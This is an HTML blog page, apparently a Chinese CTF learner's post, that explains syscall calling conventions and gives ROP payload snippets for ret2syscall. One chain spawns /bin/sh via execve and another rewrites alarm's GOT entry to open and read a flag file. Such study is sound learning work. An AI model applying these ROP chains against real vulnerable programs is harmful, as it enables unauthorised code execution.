@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/bitbug_favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/bitbug_favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"jonathanbest7.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ret2xx这两周做了很多栈溢出的题，这是很基础的东西，所以想写一下做一个归类。 基础知识系统调用怎么写：首先，如果要在rop链中用系统调用，要知道32位和64位区别： 1.传参方式不同 2.系统调用号不同 3.调用方式不同 32位传参方式： 系统调用号存在eax，参数依次放在ebx,ecx,edx,esi,edi,ebp，返回值存到eax 调用号：sys_read的调用号为3，sys_write">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2xxx">
+<meta property="og:url" content="https://jonathanbest7.github.io/2023/03/23/ret2xxx/index.html">
+<meta property="og:site_name" content="bj777的blog">
+<meta property="og:description" content="ret2xx这两周做了很多栈溢出的题，这是很基础的东西，所以想写一下做一个归类。 基础知识系统调用怎么写：首先，如果要在rop链中用系统调用，要知道32位和64位区别： 1.传参方式不同 2.系统调用号不同 3.调用方式不同 32位传参方式： 系统调用号存在eax，参数依次放在ebx,ecx,edx,esi,edi,ebp，返回值存到eax 调用号：sys_read的调用号为3，sys_write">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111008911.png">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111035012.png">
+<meta property="article:published_time" content="2023-03-23T02:50:54.000Z">
+<meta property="article:modified_time" content="2023-03-23T03:29:59.097Z">
+<meta property="article:author" content="bj777">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111008911.png">
+
+<link rel="canonical" href="https://jonathanbest7.github.io/2023/03/23/ret2xxx/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ret2xxx | bj777的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">bj777的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习每一瞬间</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">41</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/03/23/ret2xxx/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/bitbug_favicon.ico">
+      <meta itemprop="name" content="bj777">
+      <meta itemprop="description" content="一位逆向菜狗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="bj777的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2xxx
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-23 10:50:54 / 修改时间：11:29:59" itemprop="dateCreated datePublished" datetime="2023-03-23T10:50:54+08:00">2023-03-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ret2xx"><a href="#ret2xx" class="headerlink" title="ret2xx"></a>ret2xx</h1><p>这两周做了很多栈溢出的题，这是很基础的东西，所以想写一下做一个归类。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>系统调用怎么写：首先，如果要在rop链中用系统调用，要知道32位和64位区别：</p>
+<p>1.传参方式不同</p>
+<p>2.系统调用号不同</p>
+<p>3.调用方式不同</p>
+<p>32位传参方式：</p>
+<p>系统调用号存在eax，参数依次放在ebx,ecx,edx,esi,edi,ebp，返回值存到eax</p>
+<p>调用号：sys_read的调用号为3，sys_write的调用号为4，sys_execve的调用号为11 </p>
+<p>调用方式：使用int 0x80软中端指令进行系统调用</p>
+<p>64位传参方式：<br>系统调用号放在rax，参数依次放在rdi,rsi,rdx,r10,r8,r9,返回值存在rax</p>
+<p>（和普通函数调用仅仅在第四个参数那不同，普通的函数是参数放入rcx）</p>
+<p>调用号：sys_read的调用号为0，sys_write的调用号为1，sys_execve的调用号为59 </p>
+<p>调用方式：使用syscall函数进行系统调用</p>
+<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111008911.png" alt="image-20230323111008911"></p>
+<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230323111035012.png" alt="image-20230323111035012"></p>
+<p>举例：32位：ret2syscall，如何调用以下函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, pop_eax, <span class="number">0xb</span>, pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br></pre></td></tr></table></figure>
+
+<p>先将系统调用号存到eax，再将参数传入ebx，ecx，edx，最后执行0x80软中断</p>
+<p>64位：如何调用以下函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY)</span><br><span class="line">read(fd, bss+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line"><span class="built_in">printf</span>(bss_addr+<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*<span class="number">0</span>x<span class="number">38</span> + p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(alarm_got)</span> +p<span class="number">64</span><span class="comment">(pop_rax_ret)</span> + p<span class="number">64</span><span class="comment">(syscall_offset)</span> + p<span class="number">64</span><span class="comment">(add_rdi_al_ret)</span></span><br><span class="line"><span class="attr"># open(&quot;flag&quot;, O_RDONLY)</span></span><br><span class="line"><span class="attr">payload += p64</span><span class="comment">(pop_rsi_pop_r15_ret)</span> + p<span class="number">64</span><span class="comment">(O_RDONLY)</span> + b<span class="string">&#x27;deadbeef&#x27;</span> + p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(flag_addr)</span> + p<span class="number">64</span><span class="comment">(pop_rax_ret)</span> + p<span class="number">64</span><span class="comment">(n_sys_open)</span> + p<span class="number">64</span><span class="comment">(alarm_plt)</span></span><br><span class="line"><span class="attr"># read(fd, bss_addr+0</span>x<span class="number">100</span>, <span class="number">0</span>x<span class="number">50</span>)</span><br><span class="line">payload += p<span class="number">64</span><span class="comment">(pop_rdx_ret)</span> + p<span class="number">64</span><span class="comment">(0x50)</span> + p<span class="number">64</span><span class="comment">(pop_rsi_pop_r15_ret)</span> + p<span class="number">64</span><span class="comment">(bss_addr+0x100)</span> + b<span class="string">&#x27;deadbeef&#x27;</span> + p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(fd)</span> + p<span class="number">64</span><span class="comment">(read_plt)</span>    </span><br><span class="line"><span class="attr"># printf(bss_addr+0</span>x<span class="number">100</span>)</span><br><span class="line">payload += p<span class="number">64</span><span class="comment">(pop_rdi_ret)</span> + p<span class="number">64</span><span class="comment">(bss_addr+0x100)</span> + p<span class="number">64</span><span class="comment">(printf_plt)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先rdi存某个系统调用的got地址，再用rax存syscall相对于alarm这个系统调用的偏移地址，接下来用add将got中alarm地址+偏移就是syscall地址覆盖alarm的got地址，所以该地址变成了syscall，rdi存的就是syscall地址，接下来rsi存入open的第一个参数，r15存入垃圾数据，然后rdi存flag字符串地址，rax存open的调用号，最后用syscall来调用这个rop（改alarm的got，调用函数需要用plt）</p>
+<p>read函数本来就在程序中用过，所以不用执行系统调用。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/20/pwn2heap/" rel="prev" title="pwn2heap">
+      <i class="fa fa-chevron-left"></i> pwn2heap
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/04/04/xctf-final-SuperFlagio/" rel="next" title="xctf-final-SuperFlagio">
+      xctf-final-SuperFlagio <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2xx"><span class="nav-text">ret2xx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="bj777"
+      src="/images/bitbug_favicon.ico">
+  <p class="site-author-name" itemprop="name">bj777</p>
+  <div class="site-description" itemprop="description">一位逆向菜狗</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jonathanbest7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jonathanbest7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/506611735@qq.com" title="E-Mail → 506611735@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/bang-ji-1" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;bang-ji-1" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>知乎</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bj777</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+		<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+		<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+		<script type="text/javascript" src="/js/src/fireworks.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
